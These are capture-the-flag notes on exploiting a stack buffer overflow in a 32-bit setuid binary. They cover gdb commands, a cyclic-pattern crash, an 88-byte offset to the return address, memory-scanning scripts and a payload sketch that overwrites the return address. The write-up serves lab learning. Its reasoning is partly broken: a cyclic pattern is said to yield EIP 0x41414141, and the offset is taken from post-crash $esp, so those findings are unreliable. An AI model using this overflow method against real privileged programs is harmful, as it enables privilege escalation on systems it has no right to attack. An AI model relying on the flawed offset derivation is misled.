CTF STEPS
---

# 1) Markdown notes (copy all and save to `ctf_notes.md`)

````markdown
# CTF: task1 — rough notes and walkthrough
**Environment:** Docker container (32-bit ELF), cannot disable ASLR inside container.  
**Binary:** `task1` (setuid), debug copy `task1.debug` used for gdb.

---

## Goals
- Inspect binary
- Find potential vulnerability (buffer overflow)
- Determine offset to EIP
- Inspect runtime memory for flag
- Notes, commands & small scripts used

---

## Files produced / important copies
- `task1` — original setuid binary
- `task1.debug` — copy used for debugging (remove setuid):
  ```bash
  cp ./task1 ./task1.debug
  chmod u-s ./task1.debug
````

---

## Static checks

* Check file type:

  ```bash
  file ./task1
  ```

  Example: `setuid ELF 32-bit LSB shared object, Intel 80386, dynamically linked, ... not stripped`

* checksec (example; run inside container if available):

  ```bash
  checksec --file=./task1
  ```

* Symbol table and sections:

  ```bash
  readelf -h ./task1
  readelf -s ./task1
  objdump -d ./task1 > task1.disasm
  strings ./task1 | less
  ldd ./task1
  ```

Notes:

* Binary is 32-bit dynamically linked (ld-2.27).
* Not stripped or has limited symbols — but no debug info; `gdb` warns "No symbol table is loaded".

---

## Runtime / GDB basics (ASLR is enabled)

**Important**: In this container ASLR cannot be disabled (`echo 0 > /proc/sys/kernel/randomize_va_space` not permitted). Always compute runtime addresses after program has mapped.

### Typical workflow (plain gdb)

```bash
gdb ./task1.debug
set disassembly-flavor intel
set pagination off
run
# when program prompts for input, or after it starts, press Ctrl-C to pause
info proc mappings          # get runtime base addresses
```

From `info proc mappings` example outputs used during analysis:

```
# Example mapping snapshot (varies per run)
Binary base: 0x56604000 - 0x56607000
libc base:   0xf7d88000 - 0xf7f5d000
stack:       0xffa75000 - 0xffa96000
```

**Calculate a real runtime address**:

```
real_addr = base_of_segment + offset_in_binary
```

(e.g., `0x56604000 + 0x550`)

---

## Reproducible steps used to find overflow and offset

### 1. Create cyclic pattern

(using pwntools or pattern utilities)

```bash
python3 - <<'PY'
from pwn import cyclic
print(cyclic(300))
PY
```

### 2. Run under gdb and feed cyclic input

Inside gdb:

```gdb
run
# when prompted enter the cyclic pattern
```

Program crashed with `EIP = 0x41414141` (i.e., `AAAA`), so the overflow reached EIP.

### 3. Inspect registers & stack after crash

```gdb
info registers
x/32x $esp
```

From your session, after crash:

```
eip = 0x41414141
ebp = 0x41414141
esp = (some value, e.g., 0xffdcacd0)
x/32x $esp showed multiple 0x41414141 entries
```

### 4. Determine offset to EIP (from stack analysis)

* You can compute the offset as the byte distance between the start of your buffer (stack pointer when input occurs) and the saved return address location (where `EIP` was overwritten).
* From one stack snapshot you provided:

  * `$esp = 0xffbc0d00`
  * saved return address was observed at `0xffbc0d58`
  * offset = `0xffbc0d58 - 0xffbc0d00 = 0x58` = **88 bytes**
* Therefore: **offset to saved return address = 88 bytes**

---

## Inspecting memory to find flag (runtime)

* The flag is not necessarily present in the static binary segment (search there may return nothing).
* Often in these labs the flag is in memory at runtime (stack, heap or .data/.rodata). Because ASLR is on, read at runtime.

### Commands used to search memory

**Check memory around stack pointer:**

```gdb
# After crash or after stopping program
x/128bx $esp-0x100
x/128bx $esp
```

**Scan chunk-by-chunk and print as string**:
We used small-chunk scanning to avoid "unable to access" errors.

GDB scanning loop (example):

```gdb
set $start = $esp - 0x200
set $end   = $esp + 0x500
set $chunk = 0x20

while $start < $end
    printf "Scanning: 0x%x - 0x%x\n", $start, $start+$chunk
    x/s $start
    set $start = $start + $chunk
end
```

This printed segments and showed the `A` pattern and other binary data. That alone did not expose a flag if the flag was not in that small window.

### Printing printable bytes around stack (ASCII filter)

If `x/s` does not reveal the flag, use a printable-filter script to print ASCII characters only:

```gdb
set $start = $esp - 0x200
set $end   = $esp + 0x500
while $start < $end
    set $b = *(unsigned char*)$start
    if ($b >= 0x20 && $b <= 0x7e)
        printf "%c", $b
    else
        printf " "
    end
    set $start = $start + 1
end
printf "\n"
```

This prints visible ASCII characters in the scanned region; the flag (e.g., `flag{...}`) will appear as readable characters amidst spaces.

### Targeted search using `find` (use with correct ranges)

`find` works but must be given accessible memory ranges and will error out if the region includes unmapped pages:

```
find 0x56604000,0x56607000, "flag"    # searches binary region (often not present)
# For stack, use smaller ranges:
find 0xffd66b30,0xffd66bb0, "flag"
```

---

## Useful GDB helper scripts used (paste into gdb or source file)

### Stack scan (small chunks; safe)

```gdb
set $start = $esp - 0x200
set $end   = $esp + 0x500
set $chunk = 0x20
while $start < $end
    printf "Scanning: 0x%x - 0x%x\n", $start, $start+$chunk
    x/s $start
    set $start = $start + $chunk
end
```

### Printable ascii dump around $esp

```gdb
set $start = $esp - 0x200
set $end   = $esp + 0x500
while $start < $end
    set $b = *(unsigned char*)$start
    if ($b >= 0x20 && $b <= 0x7e)
        printf "%c", $b
    else
        printf " "
    end
    set $start = $start + 1
end
printf "\n"
```

---

## Key findings from your session (concrete)

* Binary runtime mapping example:

  ```
  0x56604000 - 0x56607000  /home/lab1/task1/task1.debug
  0xf7d88000 - ...         /lib/i386-linux-gnu/libc-2.27.so
  stack : 0xffa75000 - 0xffa96000
  ```
* Crash after `AAAAAAAA...` input; `EIP` overwritten with `0x41414141`.
* From stack snapshot: **offset to saved return address = 88 bytes**.
* Using chunk scans around `$esp` printed lots of `A`s and binary data; the flag was not directly visible in the first scanned window.

---

## How to extract the flag (recommended precise steps)

1. In gdb, run and feed input that triggers the code path that prints or stores the flag.
2. If flag is printed by a function (e.g., `printf`), set a breakpoint on `printf`:

   ```gdb
   b printf
   run
   ```

   When it stops, inspect the argument(s) on stack (`x/s` at the string pointer location).
3. If printed by an internal function (`win`, `print_flag`) set breakpoint there.
4. If flag is stored on heap or stack after some call, scan those regions in small chunks (use scripts above).
5. If the flag must be reached by redirecting control flow, use the **88-byte** offset to overwrite return address with the **address of the flag-printing function** (calculate that function’s runtime address = `binary_base + offset` obtained from `readelf`/disassembly).

---

## Commands to export notes as PDF (on host/container)

### Option A — Quick: save markdown and use `pandoc`

```bash
# save notes to ctf_notes.md (paste the markdown)
# if pandoc installed:
pandoc ctf_notes.md -o ctf_notes.pdf
```

### Option B — Print via `a2ps`/`ps2pdf` or use a text editor to export to PDF:

```bash
# convert to postscript then PDF (if tools available)
a2ps ctf_notes.md -o notes.ps
ps2pdf notes.ps ctf_notes.pdf
```

### Option C — Browser:

* Open `ctf_notes.md` in an editor, copy content into a text editor or browser markdown viewer, and **Print → Save as PDF**.

---

## Final checklist before finishing the CTF

* [ ] Confirm the offset to EIP (88 bytes) by repeating cyclic test if needed.
* [ ] Use `info proc mappings` each run to compute runtime addresses.
* [ ] Search stack/heap in small chunks for `flag` strings (`x/s` and printable filter).
* [ ] If needed, craft payload: `"A"*88 + p32(function_addr)` (function_addr computed at runtime).
* [ ] Do everything in the isolated container/VM (do not run exploits on systems you do not own).

---

### Notes / learning takeaways

* Don’t try to disable ASLR inside typical containers — compute runtime addresses.
* Use chunked memory scanning to avoid inaccessible pages.
* Use `x/s` for strings, and small printable filters when memory contains binary data.
* Offsets to EIP are stable within a single run; addresses for libraries/binary base shift across runs with ASLR.


